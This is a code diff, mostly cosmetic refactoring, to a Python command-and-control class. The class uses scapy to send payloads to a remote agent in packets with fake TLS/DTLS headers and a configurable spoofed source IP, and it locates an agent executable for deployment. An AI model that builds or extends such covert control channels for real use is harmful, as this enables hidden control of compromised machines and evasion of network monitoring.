@@ -1,7 +1,8 @@
 from c2.view import C2View
 from pathlib import Path
 from importlib.resources import files
-from scapy.all import IP, TCP, UDP, send
+from scapy.layers.inet import IP, TCP, UDP
+from scapy.sendrecv import send
 import struct
 import argparse
 import logging
@@ -29,7 +30,6 @@ class C2:
         """
 
         if args.protocol == "tcp":
-
             protocol = self.TCP
             port = 0
             seq = args.seq
@@ -87,7 +87,7 @@ class C2:
 
         return self._send_fake_tls(payload, args)
 
-    def udp_raw_send(self, args: argparse.Namespace) -> bool:
+    def udp_raw_send(self, args: argparse.Namespace) -> None:
         """Sends a raw UDP packet to the configured agent.
 
         Args:
@@ -113,7 +113,7 @@ class C2:
         dtls_header += payload_len
 
         packet = (
-            IP(dst=args.dip, src=args.sip)
+            IP(dst=args.dip, src=args.sip)  # type: ignore
             / UDP(dport=args.dport, sport=args.sport)
             / dtls_header
             / payload
@@ -150,7 +150,7 @@ class C2:
         )
         tls_header += payload_len
         packet = (
-            IP(dst=args.dip, src=args.sip)
+            IP(dst=args.dip, src=args.sip) # type: ignore
             / TCP(dport=args.dport, sport=args.sport, flags="PA", seq=args.seq, ack=1)
             / tls_header
             / payload
@@ -178,9 +178,9 @@ class C2:
             args (argparse.Namespace): argparse arguments containing the configuration options.
         """
         self.view.print_msg(f"Configuring with args: {args}")
-        path = files("c2.deploy").joinpath("agent_x86_64")
+        this_path = files("c2.deploy").joinpath("agent_x86_64")
 
-        path = Path(path).resolve()
+        path = Path(this_path).resolve()  # type: ignore
 
         if not path.exists():
             self.view.print_error("Agent executable not found.")
